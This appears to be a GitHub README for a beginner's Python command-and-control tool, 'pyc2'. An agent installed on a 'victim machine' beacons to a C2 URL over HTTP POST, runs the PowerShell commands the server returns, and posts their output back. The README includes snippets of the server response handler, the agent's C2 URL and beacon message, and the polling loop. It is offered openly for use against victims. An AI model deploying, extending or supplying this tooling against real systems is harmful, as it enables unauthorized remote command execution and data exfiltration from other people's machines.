# pyc2-c2overPOSTresponse

This project is still under development. This is a simmple C2 server that allows you to run Powershell commands. 
I am still a n33b at this but I believe that I will get better through help and suggestions from the community : ) 

It works as follows: 
- Run server.py to start a http server
- Run agent.py to send a POST request
- The server sesponds to the request with a powershell command that is ran by agent.py
- agent.py sends another POST request after the specified time with the command response
* I am working on a mechanism to allow the attacker to send a different response but for now it's a loop

## Installation

Download the .py files and run them. 

## Usage

For now you can only ran a command at a time. Open server.py and enter the command you want to be in the http response as shown below

``` 
        response_string = "whoami"

        # Set the response headers
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Content-Length", len(response_string))
        self.end_headers()

        #send response string 
        self.wfile.write(response_string.encode('utf-8'))
```

Agent.py needs to be installed and ran on the victim machine. Provide the C2 url as shown below.

```
    url = "http://localhost:8080"  # Replace your C2 URL 
    # This string will be sent to C2 to verify it's alive and return output of a command ran
    message_body = "ALIVE, Command Response: {}".format(output)
```

The http requests are sent in time intervals. You can set this in Agent.py as well. 

```
if command_to_run:
            output = run_powershell_command(command_to_run)     
        time.sleep(10)  
        count =+ 1
```

## Contributing

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License

[MIT](https://choosealicense.com/licenses/mit/)
